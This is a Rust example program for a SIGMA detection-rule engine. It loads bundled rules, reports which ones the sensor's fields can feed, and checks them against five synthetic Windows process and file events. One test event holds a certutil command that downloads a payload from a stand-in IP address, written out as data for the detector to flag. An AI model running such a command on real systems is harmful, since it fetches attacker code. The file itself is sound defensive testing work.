//! Load the bundled SIGMA rules and show them deciding on real-shaped events.
//!
//! `cargo run -p sigma --example load_rules`
//!
//! The point of the printout is the second section: which rules the sensor can
//! actually feed. A ruleset is only as good as its field mapping, and a rule
//! whose fields this sensor never emits is one that will never fire.

use model::{
    EventId, EventKind, EventSource, FileCreate, HostId, Payload, ProcessId, ProcessStart,
    ProviderId, TelemetryEvent,
};
use sigma::RuleSet;

fn event(kind: EventKind, provider: &str, event_id: u16) -> TelemetryEvent {
    TelemetryEvent::new(
        EventId::new(1),
        HostId::new("DESKTOP-DEV").expect("valid"),
        chrono::Utc::now(),
        EventSource::WindowsEtw,
        ProviderId::new(provider),
        event_id,
        4242,
        4242,
        4,
        kind,
        Payload::empty(),
    )
}

fn process(image: &str, command_line: &str) -> TelemetryEvent {
    event(
        EventKind::ProcessStart(ProcessStart {
            pid: ProcessId::new(4242),
            parent_pid: Some(ProcessId::new(4)),
            executable: image.into(),
            command_line: Some(command_line.into()),
            user: Some("CORP\\a.smith".into()),
            working_directory: None,
            started_at: chrono::Utc::now(),
            image_hash: None,
            integrity_level: None,
            is_wow64: false,
            parent_image: Some("C:\\Windows\\System32\\cmd.exe".into()),
        }),
        "Microsoft-Windows-Security-Auditing",
        4688,
    )
}

fn file_created(path: &str) -> TelemetryEvent {
    event(
        EventKind::FileCreate(FileCreate {
            pid: ProcessId::new(4242),
            path: path.into(),
            created_at: chrono::Utc::now(),
        }),
        "Microsoft-Windows-Kernel-File",
        12,
    )
}

fn main() {
    let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("rules");
    let rules = RuleSet::from_directory(&dir).expect("the rules directory reads");

    println!("rules directory: {}", dir.display());
    println!(
        "loaded {} rule(s), {} problem(s)",
        rules.len(),
        rules.problems().len()
    );
    for problem in rules.problems() {
        println!("  problem: {problem}");
    }

    println!("\nwhat the engine makes of each rule:");
    for rule in rules.rules() {
        let state = if rule.can_fire() { "live" } else { "DEAD" };
        println!(
            "  [{state}] {} — {} / {}",
            rule.title,
            rule.logsource.category,
            rule.level.as_str()
        );
        if !rule.unmapped_fields.is_empty() {
            println!(
                "         names fields this sensor never emits: {}",
                rule.unmapped_fields.join(", ")
            );
        }
    }

    let cases = [
        (
            "certutil downloading a payload (T1105)",
            process(
                "C:\\Windows\\System32\\certutil.exe",
                "certutil -urlcache -split -f http://198.51.100.7/a.dat a.dat",
            ),
        ),
        (
            "certutil encoding a local file (benign)",
            process(
                "C:\\Windows\\System32\\certutil.exe",
                "certutil -encode payload.bin payload.txt",
            ),
        ),
        (
            "C# source dropped in %TEMP% (T1027.004)",
            file_created("C:\\Users\\a.smith\\AppData\\Local\\Temp\\Stage.cs"),
        ),
        (
            "C# source in the developer's own repo (benign)",
            file_created("C:\\Users\\a.smith\\source\\repos\\app\\Program.cs"),
        ),
        (
            "an ordinary .exe drop in %TEMP% (no rule covers it)",
            file_created("C:\\Users\\a.smith\\AppData\\Local\\Temp\\dropper.exe"),
        ),
    ];

    println!("\nwhat the rules say about five events:");
    for (label, case) in &cases {
        let hits = rules.evaluate(case);
        if hits.is_empty() {
            println!("  none      {label}");
        }
        for hit in hits {
            println!("  HIT  {:<10} {:<44} {}", hit.technique, label, hit.title);
        }
    }
}
